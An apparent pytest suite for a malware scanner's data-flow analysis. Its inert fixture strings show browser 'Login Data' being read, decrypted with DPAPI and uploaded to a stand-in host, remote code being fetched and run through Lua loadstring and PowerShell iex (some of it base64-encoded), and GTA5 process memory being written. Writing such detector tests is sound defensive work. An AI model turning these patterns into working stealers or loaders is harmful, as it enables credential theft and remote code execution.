"""Source relationships are scanned as inert text, never executed fixtures."""

import base64

import pytest

from malguard_core.budget import BudgetExceeded, BudgetLedger
from malguard_core.gta_context import identify_target_context
from malguard_core.scripts import lex_source
from malguard_core.scripts.flow import (
    credential_flow, decoded_execution_sources, execution_sources, source_flow_index,
    visible_flow_link,
)
from tests.builders.behavior import gta_trainer_source


def credentials(source, *, case_insensitive=False):
    lexical = lex_source(source, ".cs", BudgetLedger())
    return credential_flow(lexical.text, lexical.code,
                           case_insensitive_variables=case_insensitive, ledger=BudgetLedger())


READ = 'var raw = File.ReadAllBytes("Login Data"); '
DECRYPT = 'var clear = ProtectedData.Unprotect(raw, null, scope); '
SEND = 'uploader.UploadData("https://example.invalid/fixture", clear);'


@pytest.mark.parametrize("receiver", ["client", "uploader", "backup.Transport"])
def test_ordered_credential_lineage_accepts_arbitrary_upload_receiver(receiver):
    assert credentials(READ + DECRYPT + SEND.replace("uploader", receiver)) == (True, True)


@pytest.mark.parametrize("source,expected", [
    (READ + 'raw = File.ReadAllBytes("settings.enc"); ' + DECRYPT + SEND, (False, False)),
    (READ + DECRYPT + "clear = version; " + SEND, (True, False)),
    (DECRYPT + READ + SEND, (False, False)),
    (READ + "raw += bytes; " + DECRYPT + SEND, (False, False)),
    (READ + "Retarget(ref raw); " + DECRYPT + SEND, (False, False)),
    (READ + "var result = Retarget(ref raw); " + DECRYPT + SEND, (False, False)),
    (READ + 'raw[0] = 0; ' + DECRYPT + SEND, (False, False)),
    (READ + 'var Raw = File.ReadAllBytes("settings.enc"); '
     + DECRYPT.replace("(raw,", "(Raw,") + SEND, (False, False)),
    (READ + DECRYPT + 'var Clear = version; ' + SEND.replace(", clear)", ", Clear)"), (True, False)),
    ("void First() { " + READ + "} void Second() { " + DECRYPT + SEND + " }", (False, False)),
    ("void First() { " + READ + DECRYPT + " } void Second() { " + SEND + " }", (True, False)),
])
def test_overwrite_order_scope_and_case_do_not_invent_lineage(source, expected):
    assert credentials(source) == expected


def test_case_insensitive_language_uses_case_insensitive_bindings():
    assert credentials(READ + DECRYPT.replace("(raw,", "(RAW,") + SEND,
                       case_insensitive=True) == (True, True)


def test_unrelated_csharp_conditional_block_does_not_consume_the_enclosing_scope():
    assert credentials(READ + 'if (enabled) { Print("harmless"); } ' + DECRYPT + SEND) == (True, True)
    # Direct masked source also verifies scope handling before declaration masking.
    source = READ + 'if (enabled) { Print("harmless"); } ' + DECRYPT + SEND
    lexical = lex_source(source, ".cs", BudgetLedger())
    index = source_flow_index(lexical.code, extension=".cs")
    assert index.scope_at(lexical.code.index("raw")) == index.scope_at(lexical.code.index("clear"))


@pytest.mark.parametrize("source", [
    READ + 'if (enabled) { ' + DECRYPT + SEND + ' }',
    READ + 'if (enabled) { if (nested) { ' + DECRYPT + SEND + ' } }',
    READ + DECRYPT + 'if (enabled) { ' + SEND + ' }',
])
def test_credential_bindings_are_visible_to_lexical_child_blocks(source):
    assert credentials(source) == (True, True)


@pytest.mark.parametrize("source,expected", [
    (READ + 'if (enabled) { var raw = File.ReadAllBytes("settings.enc"); '
     + DECRYPT + SEND + ' }', (False, False)),
    (READ + 'if (enabled) { raw = File.ReadAllBytes("settings.enc"); '
     + DECRYPT + SEND + ' }', (False, False)),
    (READ + 'if (enabled) { raw = File.ReadAllBytes("settings.enc"); } '
     + DECRYPT + SEND, (False, False)),
    (READ + 'if (enabled) { Retarget(ref raw); } ' + DECRYPT + SEND, (False, False)),
    (READ + 'if (enabled) { raw[0] = 0; } ' + DECRYPT + SEND, (False, False)),
    (READ + 'if (enabled) { var raw = File.ReadAllBytes("settings.enc"); } '
     + DECRYPT + SEND, (True, True)),
    (READ + 'if (enabled) { var raw = File.ReadAllBytes("settings.enc"); '
     'raw[0] = 0; ' + DECRYPT + SEND + ' }', (False, False)),
])
def test_child_shadowing_and_parent_mutation_do_not_restore_stale_lineage(source, expected):
    assert credentials(source) == expected


@pytest.mark.parametrize("source", [
    'uploader.UploadData("https://example.invalid/fixture", '
    'ProtectedData.Unprotect(File.ReadAllBytes("Login Data"), null, scope));',
    'uploader.UploadData(\n"https://example.invalid/fixture",\n'
    'ProtectedData.Unprotect(\nFile.ReadAllBytes("Login Data"), null, scope));',
    'var clear = ProtectedData.Unprotect(File.ReadAllBytes("Login Data"), null, scope); ' + SEND,
    'uploader.PostAsync("https://example.invalid/fixture", '
    'System.Security.Cryptography.ProtectedData.Unprotect('
    'System.IO.File.ReadAllBytes("Login Data"), null, scope));',
])
def test_nested_credential_calls_supply_explicit_lineage(source):
    assert credentials(source) == (True, True)


def test_documentation_and_unrelated_decryption_remain_unlinked():
    source = 'var docs = "Login Data"; var raw = File.ReadAllBytes("settings.enc"); ' + DECRYPT + SEND
    assert credentials(source) == (False, False)


@pytest.mark.parametrize("source,extension,expected", [
    ('local body = http.get("https://example.invalid/fixture"); loadstring(body)', ".lua", True),
    ('local body = http.get("https://example.invalid/fixture"); body = "return 42"; loadstring(body)', ".lua", False),
    ('local body = http.get("https://example.invalid/fixture"); local Body = "return 42"; loadstring(Body)', ".lua", False),
    ('function first() local body = http.get("https://example.invalid/fixture") end\n'
     'function second() local body = "return 42"; loadstring(body) end', ".lua", False),
    ('loadstring(body); local body = http.get("https://example.invalid/fixture")', ".lua", False),
    ('$body = Invoke-WebRequest "https://example.invalid/fixture"; iex $BODY', ".ps1", True),
])
def test_reusable_visible_flow_index_guards_dynamic_arguments(source, extension, expected):
    lexical = lex_source(source, extension, BudgetLedger())
    variable = "$body" if extension == ".ps1" else "body"
    producer = lexical.code.index(variable)
    consumer = lexical.code.index("$BODY") if extension == ".ps1" else lexical.code.index("loadstring(") + len("loadstring(")
    index = source_flow_index(lexical.code, case_insensitive_variables=extension == ".ps1",
                              ledger=BudgetLedger())
    assert visible_flow_link(lexical.code, variable, producer, consumer, index=index) is expected


def test_source_flow_work_and_depth_are_bounded():
    with pytest.raises(BudgetExceeded):
        credential_flow(READ, READ, ledger=BudgetLedger({"parser_iterations": 0}))
    with pytest.raises(BudgetExceeded):
        source_flow_index("(" * 65 + ")" * 65)
    with pytest.raises(BudgetExceeded):
        source_flow_index("x;" * 32_769)


BODY = 'PerformHttpRequest("https://example.invalid/fixture", function(s,b) loadstring(b) end)'
ENCODED = base64.b64encode(BODY.encode()).decode()


def decoded_sources(source):
    lexical = lex_source(source, ".lua", BudgetLedger())
    return decoded_execution_sources(lexical.text, lexical.code, ".lua", ledger=BudgetLedger())


@pytest.mark.parametrize("source", [
    f'loadstring(base64.decode("{ENCODED}"))()',
    f'local encoded="{ENCODED}"; local body=base64.decode(encoded); loadstring(body)()',
    f'local encoded="{ENCODED}"; loadstring(mime.unb64(encoded))()',
    f'loadstring(hex.decode("{BODY.encode().hex()}"))()',
])
def test_explicit_constant_decoder_feeds_the_executed_body(source):
    assert decoded_sources(source) == (BODY,)


@pytest.mark.parametrize("source", [
    f'local docs="{ENCODED}"; loadstring("return 0")()',
    f'local docs="{ENCODED}"; loadstring(docs)()',
    f'local docs="{ENCODED}"; local body=base64.decode(docs); body="return 0"; loadstring(body)()',
    f'function first() local docs="{ENCODED}" end; '
    'function second() local body=base64.decode(docs); loadstring(body)() end',
    f'local docs="{ENCODED}"; local Docs="unrelated"; loadstring(base64.decode(Docs))()',
])
def test_unrelated_stale_or_unexecuted_encoded_data_remains_data(source):
    assert decoded_sources(source) == ()


def test_explicit_decode_work_uses_the_shared_budget():
    source = f'loadstring(base64.decode("{ENCODED}"))()'
    lexical = lex_source(source, ".lua", BudgetLedger())
    with pytest.raises(BudgetExceeded):
        decoded_execution_sources(lexical.text, lexical.code, ".lua",
                                  ledger=BudgetLedger({"decoded_candidates": 0}))


def executed_sources(source, ledger=None):
    lexical = lex_source(source, ".lua", BudgetLedger())
    return execution_sources(lexical.text, lexical.code, ".lua", ledger=ledger or BudgetLedger())


@pytest.mark.parametrize("source", [
    f"loadstring('{BODY}')()",
    f"local body='{BODY}'; loadstring(body)()",
    f"local body='{BODY}'; if enabled then load(body)() end",
    'loadstring("' + BODY.replace('"', '\\"') + '")()',
])
def test_plaintext_constant_visibly_passed_to_a_sink_becomes_source(source):
    assert executed_sources(source) == ((BODY, False),)


def test_plaintext_and_decoded_sources_keep_provenance_and_deduplicate():
    source = f'loadstring(base64.decode("{ENCODED}"))(); loadstring(\'{BODY}\')()'
    assert executed_sources(source) == ((BODY, False),)
    assert decoded_sources(source) == (BODY,)
    assert executed_sources(f'loadstring(base64.decode("{ENCODED}"))()') == ((BODY, True),)


@pytest.mark.parametrize("source", [
    f"local docs='{BODY}'; loadstring('return 0')()",
    f"local body='{BODY}'; body='return 0'; loadstring(body)()",
    f"local body='{BODY}'; local Body='return 0'; loadstring(Body)()",
    f"function first() local body='{BODY}' end; function second() loadstring(body)() end",
])
def test_plaintext_body_requires_an_ordered_case_correct_visible_sink(source):
    assert (BODY, False) not in executed_sources(source)


def test_plaintext_source_collection_uses_shared_candidates_and_bytes():
    with pytest.raises(BudgetExceeded):
        executed_sources("loadstring('return 0')()", BudgetLedger({"decoded_candidates": 0}))
    with pytest.raises(BudgetExceeded):
        executed_sources("loadstring('return 0')()", BudgetLedger({"decoded_bytes": 1}))
    with pytest.raises(BudgetExceeded):
        executed_sources(";".join(f"loadstring('return {number}')()" for number in range(17)))
    with pytest.raises(BudgetExceeded):
        executed_sources("loadstring('" + "x" * (128 * 1024 + 1) + "')()")


@pytest.mark.parametrize("source", ["loadstring(unknown)()", "loadstring([[return 0]])()",
                                    r"loadstring('return\u{31}')()"])
def test_unmodeled_plaintext_expressions_require_caller_fallback(source):
    assert executed_sources(source) == ()


@pytest.mark.parametrize("escape", [
    'Array.Fill(targets, Process.GetProcessById(unknownPid));',
    'ChangeTarget(targets);',
    'ChangeTarget((object)targets);',
    'Array.Copy(other, targets, count);',
    'targets.ReplaceEntries(other);',
])
def test_mutable_process_array_escape_cancels_gta_proof(escape):
    source = ('var targets = Process.GetProcessesByName("GTA5");\n' + escape + '\n'
              'var handle = OpenProcess(0x28, false, targets[0].Id);\n'
              'WriteProcessMemory(handle, address, bytes, bytes.Length, out written);')
    lexical = lex_source(source, ".cs", BudgetLedger())
    assert not identify_target_context(lexical.text, True, lexical.code).gta_only


def test_clean_gta_trainer_preserves_exclusive_target_proof():
    lexical = lex_source(gta_trainer_source().decode(), ".cs", BudgetLedger())
    assert identify_target_context(lexical.text, True, lexical.code).gta_only


def test_using_a_handle_before_its_assignment_cannot_prove_gta_scope():
    source = gta_trainer_source().decode().splitlines()
    reordered = "\n".join((source[2], source[0], source[1]))
    lexical = lex_source(reordered, ".cs", BudgetLedger())
    assert not identify_target_context(lexical.text, True, lexical.code).gta_only
